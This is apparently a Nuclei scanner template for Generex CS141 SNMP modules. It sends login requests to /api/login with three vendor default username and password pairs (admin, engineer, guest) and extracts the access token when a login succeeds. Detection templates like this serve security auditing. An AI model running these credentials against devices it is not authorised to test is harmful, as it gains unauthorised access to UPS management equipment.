id: cs141-default-login

info:
  name: CS141 SNMP Module Default Credentials
  author: socketz
  severity: medium
  reference: https://www.generex.de/media/pages/packages/documents/manuals/f65348d5b6-1628841637/manual_CS141_en.pdf
  tags: hiawatha,iot,default-login

requests:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 44
        Accept: application/json, text/plain, */*
        Content-Type: application/json
        Accept-Encoding: gzip, deflate
        Accept-Language: en,es-ES;q=0.9,es;q=0.8
        Connection: close

        {"userName":"admin","password":"cs141-snmp"}

      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 44
        Accept: application/json, text/plain, */*
        Content-Type: application/json
        Accept-Encoding: gzip, deflate
        Accept-Language: en,es-ES;q=0.9,es;q=0.8
        Connection: close

        {"userName":"engineer","password":"engineer"}

      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 44
        Accept: application/json, text/plain, */*
        Content-Type: application/json
        Accept-Encoding: gzip, deflate
        Accept-Language: en,es-ES;q=0.9,es;q=0.8
        Connection: close

        {"userName":"guest","password":"guest"}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'accessToken'
          - 'application/json'
        condition: and
        part: header

      - type: status
        status:
          - 200

    extractors:
      - type: kval
        kval:
          - accessToken
